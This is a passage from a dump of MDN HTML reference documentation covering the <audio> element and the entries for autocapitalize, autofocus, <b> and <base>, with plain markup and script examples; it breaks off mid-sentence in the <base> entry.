information.\n\n[`disableremoteplayback`](#disableremoteplayback)  \nA Boolean attribute used to disable the capability of remote playback in devices that are attached using wired (HDMI, DVI, etc.) and wireless technologies (Miracast, Chromecast, DLNA, AirPlay, etc.). See [this proposed specification](https://www.w3.org/TR/remote-playback/#the-disableremoteplayback-attribute) for more information.\n\nIn Safari, you can use [`x-webkit-airplay=\"deny\"`](https://developer.apple.com/library/archive/documentation/AudioVideo/Conceptual/AirPlayGuide/OptingInorOutofAirPlay/OptingInorOutofAirPlay.html) as a fallback.\n\n[`loop`](#loop)  \nA Boolean attribute: if specified, the audio player will automatically seek back to the start upon reaching the end of the audio.\n\n[`muted`](#muted)  \nA Boolean attribute that indicates whether the audio will be initially silenced. Its default value is `false`.\n\n[`preload`](#preload)  \nThis [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute is intended to provide a hint to the browser about what the author thinks will lead to the best user experience. It may have one of the following values:\n\n- `none`: Indicates that the audio should not be preloaded.\n- `metadata`: Indicates that only audio metadata (e.g. length) is fetched.\n- `auto`: Indicates that the whole audio file can be downloaded, even if the user is not expected to use it.\n- *empty string*: A synonym of the `auto` value.\n\nThe default value is different for each browser. The spec advises it to be set to `metadata`.\n\n**Note:**\n\n- The `autoplay` attribute has precedence over `preload`. If `autoplay` is specified, the browser would obviously need to start downloading the audio for playback.\n- The browser is not forced by the specification to follow the value of this attribute; it is a mere hint.\n\n[`src`](#src)  \nThe URL of the audio to embed. This is subject to [HTTP access controls](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). This is optional; you may instead use the [`<source>`](source) element within the audio block to specify the audio to embed.\n\n## Events\n\n| Event name                                                                                                 | Fired when                                                                                                                                                                                                                                                       |\n|------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`audioprocess`](https://developer.mozilla.org/en-US/docs/Web/API/ScriptProcessorNode/audioprocess_event)  | The input buffer of a [`ScriptProcessorNode`](https://developer.mozilla.org/en-US/docs/Web/API/ScriptProcessorNode) is ready to be processed.                                                                                                                    |\n| [`canplay`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/canplay_event)               | The browser can play the media, but estimates that not enough data has been loaded to play the media up to its end without having to stop for further buffering of content.                                                                                      |\n| [`canplaythrough`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/canplaythrough_event) | The browser estimates it can play the media up to its end without stopping for content buffering.                                                                                                                                                                |\n| [`complete`](https://developer.mozilla.org/en-US/docs/Web/API/OfflineAudioContext/complete_event)          | The rendering of an [`OfflineAudioContext`](https://developer.mozilla.org/en-US/docs/Web/API/OfflineAudioContext) is terminated.                                                                                                                                 |\n| [`durationchange`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/durationchange_event) | The `duration` attribute has been updated.                                                                                                                                                                                                                       |\n| [`emptied`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/emptied_event)               | The media has become empty; for example, this event is sent if the media has already been loaded (or partially loaded), and the [`HTMLMediaElement.load`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/load) method is called to reload it. |\n| [`ended`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/ended_event)                   | Playback has stopped because the end of the media was reached.                                                                                                                                                                                                   |\n| [`loadeddata`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/loadeddata_event)         | The first frame of the media has finished loading.                                                                                                                                                                                                               |\n| [`loadedmetadata`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/loadedmetadata_event) | The metadata has been loaded.                                                                                                                                                                                                                                    |\n| [`loadstart`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/loadstart_event)           | Fired when the browser has started to load the resource.                                                                                                                                                                                                         |\n| [`pause`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/pause_event)                   | Playback has been paused.                                                                                                                                                                                                                                        |\n| [`play`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/play_event)                     | Playback has begun.                                                                                                                                                                                                                                              |\n| [`playing`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/playing_event)               | Playback is ready to start after having been paused or delayed due to lack of data.                                                                                                                                                                              |\n| [`ratechange`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/ratechange_event)         | The playback rate has changed.                                                                                                                                                                                                                                   |\n| [`seeked`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/seeked_event)                 | A *seek* operation completed.                                                                                                                                                                                                                                    |\n| [`seeking`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/seeking_event)               | A *seek* operation began.                                                                                                                                                                                                                                        |\n| [`stalled`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/stalled_event)               | The user agent is trying to fetch media data, but data is unexpectedly not forthcoming.                                                                                                                                                                          |\n| [`suspend`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/suspend_event)               | Media data loading has been suspended.                                                                                                                                                                                                                           |\n| [`timeupdate`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/timeupdate_event)         | The time indicated by the `currentTime` attribute has been updated.                                                                                                                                                                                              |\n| [`volumechange`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/volumechange_event)     | The volume has changed.                                                                                                                                                                                                                                          |\n| [`waiting`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/waiting_event)               | Playback has stopped because of a temporary lack of data                                                                                                                                                                                                         |\n\n## Usage notes\n\nBrowsers don't all support the same [file types](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Containers) and [audio codecs](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Audio_codecs); you can provide multiple sources inside nested [`<source>`](source) elements, and the browser will then use the first one it understands:\n\nhtml\n\n```\n<audio controls>\n  <source src=\"myAudio.mp3\" type=\"audio/mpeg\" />\n  <source src=\"myAudio.ogg\" type=\"audio/ogg\" />\n  <p>\n    Download <a href=\"myAudio.mp3\" download=\"myAudio.mp3\">MP3</a> or\n    <a href=\"myAudio.ogg\" download=\"myAudio.ogg\">OGG</a> audio.\n  </p>\n</audio>\n```\n\nWe offer a substantive and thorough [guide to media file types](https://developer.mozilla.org/en-US/docs/Web/Media/Formats) and the [audio codecs that can be used within them](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Audio_codecs). Also available is [a guide to the codecs supported for video](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Video_codecs).\n\nOther usage notes:\n\n- If you don't specify the `controls` attribute, the audio player won't include the browser's default controls. You can, however, create your own custom controls using JavaScript and the [`HTMLMediaElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) API.\n- To allow precise control over your audio content, `HTMLMediaElement`s fire many different [events](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement#events). This also provides a way to monitor the audio's fetching process so you can watch for errors or detect when enough is available to begin to play or manipulate it.\n- You can also use the [Web Audio API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API) to directly generate and manipulate audio streams from JavaScript code rather than streaming pre-existing audio files.\n- `<audio>` elements can't have subtitles or captions associated with them in the same way that `<video>` elements can. See [WebVTT and Audio](https://www.iandevlin.com/blog/2015/12/html5/webvtt-and-audio/) by Ian Devlin for some useful information and workarounds.\n- To test the fallback content on browsers that support the element, you can replace `<audio>` with a non-existing element like `<notanaudio>`.\n\nA good general source of information on using HTML `<audio>` is the [Video and audio content](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Video_and_audio_content) beginner's tutorial.\n\n### Styling with CSS\n\nThe `<audio>` element has no intrinsic visual output of its own unless the `controls` attribute is specified, in which case the browser's default controls are shown.\n\nThe default controls have a [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display) value of `inline` by default, and it is often a good idea to set the value to `block` to improve control over positioning and layout, unless you want it to sit within a text block or similar.\n\nYou can style the default controls with properties that affect the block as a single unit, so for example you can give it a [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border) and [`border-radius`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-radius), [`padding`](https://developer.mozilla.org/en-US/docs/Web/CSS/padding), [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin), etc. You can't however style the individual components inside the audio player (e.g. change the button size or icons, change the font, etc.), and the controls are different across the different browsers.\n\nTo get a consistent look and feel across browsers, you'll need to create custom controls; these can be marked up and styled in whatever way you want, and then JavaScript can be used along with the [`HTMLMediaElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) API to wire up their functionality.\n\n[Video player styling basics](https://developer.mozilla.org/en-US/docs/Web/Media/Audio_and_video_delivery/Video_player_styling_basics) provides some useful styling techniques — it is written in the context of `<video>`, but much of it is equally applicable to `<audio>`.\n\n### Detecting addition and removal of tracks\n\nYou can detect when tracks are added to and removed from an `<audio>` element using the [`addtrack`](https://developer.mozilla.org/en-US/docs/Web/API/AudioTrackList/addtrack_event) and [`removetrack`](https://developer.mozilla.org/en-US/docs/Web/API/AudioTrackList/removetrack_event) events. However, these events aren't sent directly to the `<audio>` element itself. Instead, they're sent to the track list object within the `<audio>` element's [`HTMLMediaElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) that corresponds to the type of track that was added to the element:\n\n[`HTMLMediaElement.audioTracks`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/audioTracks)  \nAn [`AudioTrackList`](https://developer.mozilla.org/en-US/docs/Web/API/AudioTrackList) containing all of the media element's audio tracks. You can add a listener for `addtrack` to this object to be alerted when new audio tracks are added to the element.\n\n[`HTMLMediaElement.videoTracks`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/videoTracks)  \nAdd an `addtrack` listener to this [`VideoTrackList`](https://developer.mozilla.org/en-US/docs/Web/API/VideoTrackList) object to be informed when video tracks are added to the element.\n\n[`HTMLMediaElement.textTracks`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/textTracks)  \nAdd an `addtrack` event listener to this [`TextTrackList`](https://developer.mozilla.org/en-US/docs/Web/API/TextTrackList) to be notified when new text tracks are added to the element.\n\n**Note:** Even though it's an `<audio>` element, it still has video and text track lists, and can in fact be used to present video, although the user interface implications can be odd.\n\nFor example, to detect when audio tracks are added to or removed from an `<audio>` element, you can use code like this:\n\njs\n\n```\nconst elem = document.querySelector(\"audio\");\n\nelem.audioTrackList.onaddtrack = (event) => {\n  trackEditor.addTrack(event.track);\n};\n\nelem.audioTrackList.onremovetrack = (event) => {\n  trackEditor.removeTrack(event.track);\n};\n```\n\nThis code watches for audio tracks to be added to and removed from the element, and calls a hypothetical function on a track editor to register and remove the track from the editor's list of available tracks.\n\nYou can also use [`addEventListener()`](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener) to listen for the [`addtrack`](https://developer.mozilla.org/en-US/docs/Web/API/AudioTrackList/addtrack_event) and [`removetrack`](https://developer.mozilla.org/en-US/docs/Web/API/AudioTrackList/removetrack_event) events.\n\n## Accessibility\n\nAudio with spoken dialog should provide both captions and transcripts that accurately describe its content. Captions, which are specified using [WebVTT](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API), allow people who are hearing impaired to understand an audio recording's content as the recording is being played, while transcripts allow people who need additional time to be able to review the recording's content at a pace and format that is comfortable for them.\n\nIf automatic captioning services are used, it is important to review the generated content to ensure it accurately represents the source audio.\n\nThe `<audio>` element doesn't directly support WebVTT. You will have to find a library or framework that provides the capability for you, or write the code to display captions yourself. One option is to play your audio using a [`<video>`](video) element, which does support WebVTT.\n\nIn addition to spoken dialog, subtitles and transcripts should also identify music and sound effects that communicate important information. This includes emotion and tone. For example, in the WebVTT below, note the use of square brackets to provide tone and emotional insight to the viewer; this can help establish the mood otherwise provided using music, nonverbal sounds and crucial sound effects, and so forth.\n\n```\n1\n00:00:00 --> 00:00:45\n[Energetic techno music]\n\n2\n00:00:46 --> 00:00:51\nWelcome to the Time Keeper's podcast! In this episode we're discussing which Swisswatch is a wrist switchwatch?\n\n16\n00:00:52 --> 00:01:02\n[Laughing] Sorry! I mean, which wristwatch is a Swiss wristwatch?\n```\n\nAlso it's a good practice to provide some content (such as the direct download link) as a fallback for viewers who use a browser in which the `<audio>` element is not supported:\n\nhtml\n\n```\n<audio controls>\n  <source src=\"myAudio.mp3\" type=\"audio/mpeg\" />\n  <source src=\"myAudio.ogg\" type=\"audio/ogg\" />\n  <p>\n    Download <a href=\"myAudio.mp3\">MP3</a> or\n    <a href=\"myAudio.ogg\" download=\"myAudio.ogg\">OGG</a> audio.\n  </p>\n</audio>\n```\n\n- [Web Video Text Tracks Format (WebVTT)](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API)\n- [WebAIM: Captions, Transcripts, and Audio Descriptions](https://webaim.org/techniques/captions/)\n- [MDN Understanding WCAG, Guideline 1.2 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.2_%E2%80%94_providing_text_alternatives_for_time-based_media)\n- [Understanding Success Criterion 1.2.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/media-equiv-av-only-alt.html)\n- [Understanding Success Criterion 1.2.2 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/media-equiv-captions.html)\n\n## Examples\n\n### Basic usage\n\nThe following example shows simple usage of the `<audio>` element to play an OGG file. It will autoplay due to the `autoplay` attribute—if the page has permission to do so—and also includes fallback content.\n\nhtml\n\n```\n<!-- Simple audio playback -->\n<audio src=\"AudioTest.ogg\" autoplay>\n  <a href=\"AudioTest.ogg\" download=\"AudioTest.ogg\">Download OGG audio</a>.\n</audio>\n```\n\nFor details on when autoplay works, how to get permission to use autoplay, and how and when it's appropriate to use autoplay, see our [autoplay guide](https://developer.mozilla.org/en-US/docs/Web/Media/Autoplay_guide).\n\n### \\<audio\\> element with \\<source\\> element\n\nThis example specifies which audio track to embed using the `src` attribute on a nested `<source>` element rather than directly on the `<audio>` element. It is always useful to include the file's MIME type inside the `type` attribute, as the browser is able to instantly tell if it can play that file, and not waste time on it if not.\n\nhtml\n\n```\n<audio controls>\n  <source src=\"foo.wav\" type=\"audio/wav\" />\n  <a href=\"foo.wav\" download=\"foo.wav\">Download WAV audio</a>.\n</audio>\n```\n\n### \\<audio\\> with multiple \\<source\\> elements\n\nThis example includes multiple `<source>` elements. The browser tries to load the first source element (Opus) if it is able to play it; if not it falls back to the second (Vorbis) and finally back to MP3:\n\nhtml\n\n```\n<audio controls>\n  <source src=\"foo.opus\" type=\"audio/ogg; codecs=opus\" />\n  <source src=\"foo.ogg\" type=\"audio/ogg; codecs=vorbis\" />\n  <source src=\"foo.mp3\" type=\"audio/mpeg\" />\n</audio>\n```\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [Web media technologies](https://developer.mozilla.org/en-US/docs/Web/Media)\n  - [Media container formats (file types)](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Containers)\n  - [Guide to audio codecs used on the web](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Audio_codecs)\n- [Web Audio API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API)\n- [`HTMLAudioElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAudioElement)\n- [`<source>`](source)\n- [`<video>`](video)\n- [Learning area: Video and audio content](https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Video_and_audio_content)\n- [Cross-browser audio basics](https://developer.mozilla.org/en-US/docs/Web/Media/Audio_and_video_delivery/Cross-browser_audio_basics)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/audio](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/audio)"
- name: autocapitalize (attribute)
  summary: The autocapitalize global attribute is an enumerated attribute that controls whether inputted text is automatically capitalized and, if so, in what manner
  description: "# autocapitalize\n\nThe `autocapitalize` [global attribute](../global_attributes) is an [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute that controls whether inputted text is automatically capitalized and, if so, in what manner. This is relevant to:\n\n- [`<input>`](../element/input) and [`<textarea>`](../element/textarea) elements.\n- Any element with [`contenteditable`](contenteditable) set on it.\n\n`autocapitalize` doesn't affect behavior when typing on a physical keyboard. It affects the behavior of other input mechanisms such as virtual keyboards on mobile devices and voice input. This can assist users by making data entry quicker and easier, for example by automatically capitalizing the first letter of each sentence.\n\n## Value\n\nPossible values are:\n\n[`none`](#none) or `off`  \nDo not automatically capitalize any text.\n\n[`sentences`](#sentences) or `on`  \nAutomatically capitalize the first character of each sentence.\n\n[`words`](#words)  \nAutomatically capitalize the first character of each word.\n\n[`characters`](#characters)  \nAutomatically capitalize every character.\n\n## Usage notes\n\n- `autocapitalize` can be set on `<input>` and `<textarea>` elements, *and* on their containing [`<form>`](../element/form) elements. When `autocapitalize` is set on a `<form>` element, it sets the autocapitalize behavior for all contained `<input>`s and `<textarea>`s, overriding any `autocapitalize` values set on contained elements.\n- `autocapitalize` has no effect on the `url`, `email`, or `password` `<input>` types, where autocapitalization is never enabled.\n- Where `autocapitalize` is not specified, the adopted default behavior varies between browsers. For example:\n  - Chrome and Safari default to `on`/`sentences`\n  - Firefox defaults to `off`/`none`.\n\n## Examples\n\n### HTML\n\nhtml\n\n```\n<p>Form to test different autocapitalize settings:</p>\n\n<form>\n  <div>\n    <label for=\"default\">Default: no autocapitalize set</label>\n    <input type=\"text\" id=\"default\" name=\"default\" />\n  </div>\n  <div>\n    <label for=\"off\">autocapitalize=\"off\"</label>\n    <input type=\"text\" id=\"off\" name=\"off\" autocapitalize=\"off\" />\n  </div>\n  <div>\n    <label for=\"none\">autocapitalize=\"none\"</label>\n    <input type=\"text\" id=\"none\" name=\"none\" autocapitalize=\"none\" />\n  </div>\n  <div>\n    <label for=\"on\">autocapitalize=\"on\"</label>\n    <input type=\"text\" id=\"on\" name=\"on\" autocapitalize=\"on\" />\n  </div>\n  <div>\n    <label for=\"sentences\">autocapitalize=\"sentences\"</label>\n    <input\n      type=\"text\"\n      id=\"sentences\"\n      name=\"sentences\"\n      autocapitalize=\"sentences\" />\n  </div>\n  <div>\n    <label for=\"words\">autocapitalize=\"words\"</label>\n    <input type=\"text\" id=\"words\" name=\"words\" autocapitalize=\"words\" />\n  </div>\n  <div>\n    <label for=\"characters\">autocapitalize=\"characters\"</label>\n    <input\n      type=\"text\"\n      id=\"characters\"\n      name=\"characters\"\n      autocapitalize=\"characters\" />\n  </div>\n  <div>\n    <label for=\"characters-ta\">autocapitalize=\"characters\" on textarea</label>\n    <textarea\n      type=\"text\"\n      id=\"characters-ta\"\n      name=\"characters-ta\"\n      autocapitalize=\"characters\">\n    </textarea>\n  </div>\n</form>\n\n<hr />\n\n<p contenteditable autocapitalize=\"characters\">\n  This content is editable and has autocapitalize=\"characters\" set on it\n</p>\n```\n\n## Result\n\nTest the effect on each input using a virtual keyboard or voice entry (keyboard entry will not work).\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                  | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                  | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `autocapitalize` | 43      | 79   | 111     | 30    | No     | 43             | 111                 | 30            | 5             | 4.0              | 43              |     |\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/autocapitalize](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/autocapitalize)"
- name: autocomplete (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`autocomplete`](attributes/autocomplete)

    [`<form>`](element/form), [`<input>`](element/input), [`<select>`](element/select), [`<textarea>`](element/textarea)

    Indicates whether controls in this form can by default have their values automatically completed by the browser.
- name: autofocus (attribute)
  summary: The autofocus global attribute is a Boolean attribute indicating that an element should be focused on page load, or when the <dialog> that it is part of is displayed
  description: "# autofocus\n\nThe `autofocus` [global attribute](../global_attributes) is a Boolean attribute indicating that an element should be focused on page load, or when the [`<dialog>`](../element/dialog) that it is part of is displayed.\n\nhtml\n\n```\n<input name=\"q\" autofocus />\n```\n\nNo more than one element in the document or dialog may have the autofocus attribute. If applied to multiple elements the first one will receive focus.\n\n**Note:** The `autofocus` attribute applies to all elements, not just form controls. For example, it might be used on a [contenteditable](contenteditable) area.\n\n## Accessibility concerns\n\nAutomatically focusing a form control can confuse visually-impaired people using screen-reading technology and people with cognitive impairments. When `autofocus` is assigned, screen-readers \"teleport\" their user to the form control without warning them beforehand.\n\nUse careful consideration for accessibility when applying the `autofocus` attribute. Automatically focusing on a control can cause the page to scroll on load. The focus can also cause dynamic keyboards to display on some touch devices. While a screen reader will announce the label of the form control receiving focus, the screen reader will not announce anything before the label, and the sighted user on a small device will equally miss the context created by the preceding content.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/autofocus](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/autofocus)"
- name: autoplay (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`autoplay`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autoplay)

    [`<audio>`](element/audio), [`<video>`](element/video)

    The audio or video should play as soon as possible.
- name: b
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<b\\>: The Bring Attention To element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fb&level=high)\n\nThe `<b>` [HTML](../index) element is used to draw the reader's attention to the element's contents, which are not otherwise granted special importance. This was formerly known as the Boldface element, and most browsers still draw the text in boldface. However, you should not use `<b>` for styling text or granting importance. If you wish to create boldface text, you should use the CSS [`font-weight`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-weight) property. If you wish to indicate an element is of special importance, you should use the [`<strong>`](strong) element.\n\n## Try it\n\n#### HTML Demo: \\<b\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      The two most popular science courses offered by the school are <b class=\"term\">chemistry</b> (the study of chemicals\n      and the composition of substances) and <b class=\"term\">physics</b> (the study of the nature and properties of matter\n      and energy).\n    </p>\n\n    /* stylelint-disable-next-line block-no-empty */\n    b {\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Use the `<b>` for cases like keywords in a summary, product names in a review, or other spans of text whose typical presentation would be boldfaced (but not including any special importance).\n- Do not confuse the `<b>` element with the [`<strong>`](strong), [`<em>`](em), or [`<mark>`](mark) elements. The [`<strong>`](strong) element represents text of certain *importance*, [`<em>`](em) puts some emphasis on the text and the [`<mark>`](mark) element represents text of certain *relevance*. The `<b>` element doesn't convey such special semantic information; use it only when no others fit.\n- Similarly, do not mark titles and headings using the `<b>` element. For this purpose, use the [h1](heading_elements) to [h6](heading_elements) tags. Further, stylesheets can change the default style of these elements, with the result that they are not *necessarily* displayed in bold.\n- It is a good practice to use the [`class`](../global_attributes#class) attribute on the `<b>` element in order to convey additional semantic information as needed (for example `<b class=\"lead\">` for the first sentence in a paragraph). This makes it easier to manage multiple use cases of `<b>` if your stylistic needs change, without the need to change all of its uses in the HTML.\n- Historically, the `<b>` element was meant to make text boldface. Styling information has been deprecated since HTML4, so the meaning of the `<b>` element has been changed.\n- If there is no semantic purpose to using the `<b>` element, you should use the CSS [`font-weight`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-weight) property with the value `\"bold\"` instead in order to make text bold.\n\n## Examples\n\nhtml\n\n```\n<p>\n  This article describes several <b class=\"keywords\">text-level</b> elements. It\n  explains their usage in an <b class=\"keywords\">HTML</b> document.\n</p>\nKeywords are displayed with the default style of the\n<b>element, likely in bold.</b>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role)                                   |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- Other elements conveying text-level semantics: [`<a>`](a), [`<em>`](em), [`<strong>`](strong), [`<small>`](small), [`<cite>`](cite), [`<q>`](q), [`<dfn>`](dfn), [`<abbr>`](abbr), [`<time>`](time), [`<code>`](code), [`<var>`](var), [`<samp>`](samp), [`<kbd>`](kbd), [`<sub>`](sub), [`<sup>`](sup), [`<i>`](i), [`<mark>`](mark), [`<ruby>`](ruby), [`<rp>`](rp), [`<rt>`](rt), [`<bdo>`](bdo), [`<span>`](span), [`<br>`](br), [`<wbr>`](wbr).\n- [Using \\<b\\> and \\<i\\> elements (W3C)](https://www.w3.org/International/questions/qa-b-and-i-tags)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/b](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/b)"
- name: background (attribute)
  summary: 'Note: Although browsers and email clients may still support this attribute, it is obsolete'
  belongs_to: Attributes
  description: |-
    `background`

    [`<body>`](element/body), [`<table>`](element/table), [`<td>`](element/td), [`<th>`](element/th)

    Specifies the URL of an image file.

    **Note:** Although browsers and email clients may still support this attribute, it is obsolete. Use CSS [`background-image`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-image) instead.
- name: base
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<base\\>: The Document Base URL element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fbase&level=high)\n\nThe `<base>` [HTML](../index) element specifies the base URL to use for all *relative* URLs in a document. There can be only one `<base>` element in a document.\n\nA document's used base URL can be accessed by scripts with [`Node.baseURI`](https://developer.mozilla.org/en-US/docs/Web/API/Node/baseURI). If the document has no `<base>` elements, then `baseURI` defaults to [`location.href`](https://developer.mozilla.org/en-US/docs/Web/API/Location/href).\n\n## Attributes\n\nThis element's attributes include the [global attributes](../global_attributes).\n\n**Warning:** A `<base>` element must have an `href` attribute, a `target` attribute, or both. If at least one of these attributes are specified, the `<base>` element **must** come before other elements with attribute values that are URLs, such as a [`<link>`](link)'s `href` attribute.\n\n[`href`](#href)  \nThe base URL to be used throughout the document for relative URLs. Absolute and relative URLs are allowed. [`data:`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs) and `javascript:` URLs are not allowed.\n\n[`target`](#target)  \nA **keyword** or **author-defined name** of the default [browsing context](https://developer.mozilla.org/en-US/docs/Glossary/Browsing_context) to show the results of navigation from [`<a>`](a), [`<area>`](area), or [`<form>`](form) elements without explicit `target` attributes. The following keywords have special meanings:\n\n- `_self` (default): Show the result in the current browsing context.\n- `_blank`: Show the result in a new, unnamed browsing context.\n- `_parent`: Show the result in the parent browsing context of the current one, if the current page is inside a frame. If there is no parent, acts the same as `_self`.\n- `_top`: Show the result in the topmost browsing context (the browsing context that is an ancestor of the current one and has no parent). If there is no parent, acts the same as `_self`.\n\n## Usage notes\n\n### Multiple \\<base\\> elements\n\nIf multiple `<base>` elements are used, only the first `href` and first `target` are obeyed — all others are ignored.\n\n### In-page anchors\n\nLinks pointing to a fragment in the document — e.g. `<a href=\"#some-id\">` — are resolved with the `<base>`, triggering an HTTP request to the base URL with the fragment attached.\n\nFor example, given `<base href=\"https://example.com/\">` and this link: `<a href=\"#anchor\">To anchor</a>`. The link points to `https://example.com/#anchor`.\n\n### target may not contain ASCII newline, tab, or \\<\n\nIf the [`target`](#target) attribute contains an ASCII newline, tab, or the `<` character, the value is reset to `_blank`. This is to prevent dangling markup injection attacks, a script-less attack in which an unclosed `target` attribute is injected into the page so that any text that follows is captured until the browser 